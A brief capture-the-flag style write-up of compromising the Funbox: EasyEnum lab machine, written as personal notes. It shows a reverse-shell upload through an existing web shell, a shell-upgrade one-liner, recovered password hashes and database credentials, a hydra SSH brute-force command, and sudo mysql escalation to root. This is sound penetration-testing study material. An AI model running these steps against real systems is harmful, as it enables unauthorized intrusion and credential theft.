# Funbox: EasyEnum

![[Pasted image 20220520194954.png]]

```
192.168.1.136
```

## Port scan
```
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
```

Found `mini.php` which is some mini shell.
I was able to upload `php-reverse-shell.php` and get a shell as www-data.

upgrade the shell

```python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

### Privesc from www-data

```
/etc/passwd:oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
```


dbpass=`tgbzhnujm`  
dbuser=`phpmyadmin`

![[Pasted image 20220520220219.png]]

```
ssh oracle@192.168.1.136
```

```
hiphop
```

### Privesc 

![[Pasted image 20220525215614.png]]

linpeas discovered a few users that were previously logged in. I added their usernames to users.txt then brute forced.

```
hydra -u -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.136 ssh
```

![[Pasted image 20220525213407.png]]

The user goat is allowed to run `mysql` with sudo privs. 

![[Pasted image 20220525215746.png]]

[GTFObins](https://gtfobins.github.io/gtfobins/mysql/#sudo) to the rescue.

![[Pasted image 20220525215751.png]]

Root

![[Pasted image 20220525215807.png]]